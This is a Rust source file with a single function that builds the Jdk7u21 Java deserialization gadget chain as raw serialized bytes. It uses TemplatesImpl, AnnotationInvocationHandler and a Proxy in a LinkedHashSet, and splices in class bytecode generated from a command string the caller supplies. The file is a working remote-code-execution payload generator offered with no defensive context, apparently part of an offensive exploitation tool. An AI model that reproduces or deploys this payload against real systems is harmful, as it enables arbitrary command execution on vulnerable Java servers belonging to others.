use crate::template_impl::get_f_template_impl;

pub fn get_jdk7u21(cmd: &str) -> Vec<u8> {
    let mut result_bytes = [
        172, 237, 0, 5, 115, 114, 0, 23, 106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 76, 105,
        110, 107, 101, 100, 72, 97, 115, 104, 83, 101, 116, 216, 108, 215, 90, 149, 221, 42, 30, 2,
        0, 0, 120, 114, 0, 17, 106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 72, 97, 115, 104, 83,
        101, 116, 186, 68, 133, 149, 150, 184, 183, 52, 3, 0, 0, 120, 112, 119, 12, 0, 0, 0, 16,
        63, 64, 0, 0, 0, 0, 0, 2, 115, 114, 0, 58, 99, 111, 109, 46, 115, 117, 110, 46, 111, 114,
        103, 46, 97, 112, 97, 99, 104, 101, 46, 120, 97, 108, 97, 110, 46, 105, 110, 116, 101, 114,
        110, 97, 108, 46, 120, 115, 108, 116, 99, 46, 116, 114, 97, 120, 46, 84, 101, 109, 112,
        108, 97, 116, 101, 115, 73, 109, 112, 108, 9, 87, 79, 193, 110, 172, 171, 51, 3, 0, 6, 73,
        0, 13, 95, 105, 110, 100, 101, 110, 116, 78, 117, 109, 98, 101, 114, 73, 0, 14, 95, 116,
        114, 97, 110, 115, 108, 101, 116, 73, 110, 100, 101, 120, 91, 0, 10, 95, 98, 121, 116, 101,
        99, 111, 100, 101, 115, 116, 0, 3, 91, 91, 66, 91, 0, 6, 95, 99, 108, 97, 115, 115, 116, 0,
        18, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 76, 0,
        5, 95, 110, 97, 109, 101, 116, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83,
        116, 114, 105, 110, 103, 59, 76, 0, 17, 95, 111, 117, 116, 112, 117, 116, 80, 114, 111,
        112, 101, 114, 116, 105, 101, 115, 116, 0, 22, 76, 106, 97, 118, 97, 47, 117, 116, 105,
        108, 47, 80, 114, 111, 112, 101, 114, 116, 105, 101, 115, 59, 120, 112, 0, 0, 0, 0, 255,
        255, 255, 255, 117, 114, 0, 3, 91, 91, 66, 75, 253, 25, 21, 103, 103, 219, 55, 2, 0, 0,
        120, 112, 0, 0, 0, 1, 117, 114, 0, 2, 91, 66, 172, 243, 23, 248, 6, 8, 84, 224, 2, 0, 0,
        120, 112,
    ]
    .to_vec();
    let template_impl = get_f_template_impl(cmd);
    let template_impl_len = template_impl.len() as u32;
    result_bytes.extend(template_impl_len.to_be_bytes());
    result_bytes.extend(&template_impl);
    result_bytes.extend([
        112, 116, 0, 4, 68, 111, 103, 101, 112, 119, 1, 0, 120, 115, 125, 0, 0, 0, 1, 0, 29, 106,
        97, 118, 97, 120, 46, 120, 109, 108, 46, 116, 114, 97, 110, 115, 102, 111, 114, 109, 46,
        84, 101, 109, 112, 108, 97, 116, 101, 115, 120, 114, 0, 23, 106, 97, 118, 97, 46, 108, 97,
        110, 103, 46, 114, 101, 102, 108, 101, 99, 116, 46, 80, 114, 111, 120, 121, 225, 39, 218,
        32, 204, 16, 67, 203, 2, 0, 1, 76, 0, 1, 104, 116, 0, 37, 76, 106, 97, 118, 97, 47, 108,
        97, 110, 103, 47, 114, 101, 102, 108, 101, 99, 116, 47, 73, 110, 118, 111, 99, 97, 116,
        105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 120, 112, 115, 114, 0, 50, 115, 117,
        110, 46, 114, 101, 102, 108, 101, 99, 116, 46, 97, 110, 110, 111, 116, 97, 116, 105, 111,
        110, 46, 65, 110, 110, 111, 116, 97, 116, 105, 111, 110, 73, 110, 118, 111, 99, 97, 116,
        105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 85, 202, 245, 15, 21, 203, 126, 165, 2, 0,
        2, 76, 0, 12, 109, 101, 109, 98, 101, 114, 86, 97, 108, 117, 101, 115, 116, 0, 15, 76, 106,
        97, 118, 97, 47, 117, 116, 105, 108, 47, 77, 97, 112, 59, 76, 0, 4, 116, 121, 112, 101,
        116, 0, 17, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59,
        120, 112, 115, 114, 0, 17, 106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 72, 97, 115, 104,
        77, 97, 112, 5, 7, 218, 193, 195, 22, 96, 209, 3, 0, 2, 70, 0, 10, 108, 111, 97, 100, 70,
        97, 99, 116, 111, 114, 73, 0, 9, 116, 104, 114, 101, 115, 104, 111, 108, 100, 120, 112, 63,
        64, 0, 0, 0, 0, 0, 12, 119, 8, 0, 0, 0, 16, 0, 0, 0, 1, 116, 0, 8, 102, 53, 97, 53, 97, 54,
        48, 56, 113, 0, 126, 0, 8, 120, 118, 114, 0, 29, 106, 97, 118, 97, 120, 46, 120, 109, 108,
        46, 116, 114, 97, 110, 115, 102, 111, 114, 109, 46, 84, 101, 109, 112, 108, 97, 116, 101,
        115, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 120, 112, 120,
    ]);
    return result_bytes;
}
